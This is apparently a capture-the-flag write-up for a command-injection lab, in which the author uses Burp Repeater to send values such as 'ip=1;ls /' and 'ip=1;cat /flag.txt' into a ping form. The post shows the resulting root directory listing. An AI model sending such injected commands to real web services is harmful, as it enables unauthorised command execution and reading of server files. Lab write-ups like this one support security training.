## Challenge

Try using request repeating to be able to quickly test commands. With that, try looking for the other flag.

## Solution

On Burp Repeater, I send the request to add just a number, like 1 to the ping function on the web page.

I modify the body on repeater to `ip=1;ls ../` and I see the result is `html` so let's, just try to check the list of foles on the root directory, by writing `ip=1;ls /`.

The result is:

```sh
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

So there is another `flag.txt` and modify the body to `ip=1;cat /flag.txt` and the flag is `c`.